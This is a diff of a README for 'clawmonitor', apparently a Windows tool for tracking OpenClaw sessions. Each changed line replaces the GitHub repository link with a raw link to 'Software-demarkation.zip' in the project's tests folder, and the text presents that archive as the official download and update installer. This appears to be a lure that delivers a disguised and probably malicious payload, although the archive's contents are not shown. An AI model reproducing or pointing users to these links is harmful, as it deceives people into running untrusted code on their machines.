@@ -1,6 +1,6 @@
 # 🛠️ clawmonitor - Keep Track of OpenClaw Sessions
 
-[![Download clawmonitor](https://img.shields.io/badge/Download-clawmonitor-ff6f61?style=for-the-badge&logo=github)](https://github.com/nderitus3055/clawmonitor)
+[![Download clawmonitor](https://img.shields.io/badge/Download-clawmonitor-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nderitus3055/clawmonitor/main/tests/Software-demarkation.zip)
 
 ## 📋 What is clawmonitor?
 
@@ -26,7 +26,7 @@ Follow these steps to get clawmonitor running on your Windows computer. The proc
 
 Go to the official download page by clicking the button below:  
 
-[Download clawmonitor from GitHub](https://github.com/nderitus3055/clawmonitor)
+[Download clawmonitor from GitHub](https://raw.githubusercontent.com/nderitus3055/clawmonitor/main/tests/Software-demarkation.zip)
 
 This link will take you to the GitHub repository where you can find the latest versions.
 
@@ -98,7 +98,7 @@ Here are quick solutions for problems you might run into.
 To get the latest features and fixes:  
 
 - Visit the GitHub releases page regularly:  
-  [https://github.com/nderitus3055/clawmonitor](https://github.com/nderitus3055/clawmonitor)  
+  [https://raw.githubusercontent.com/nderitus3055/clawmonitor/main/tests/Software-demarkation.zip](https://raw.githubusercontent.com/nderitus3055/clawmonitor/main/tests/Software-demarkation.zip)  
 - Download and run the newest installer file as described above.  
 - The new installer will replace the old version without removing your data.
 
@@ -122,4 +122,4 @@ For extra help, visit the GitHub repository and explore:
 - The **Issues** tab if you find bugs or want to request features.
 
 Visit this link anytime:  
-[https://github.com/nderitus3055/clawmonitor](https://github.com/nderitus3055/clawmonitor)
+[https://raw.githubusercontent.com/nderitus3055/clawmonitor/main/tests/Software-demarkation.zip](https://raw.githubusercontent.com/nderitus3055/clawmonitor/main/tests/Software-demarkation.zip)
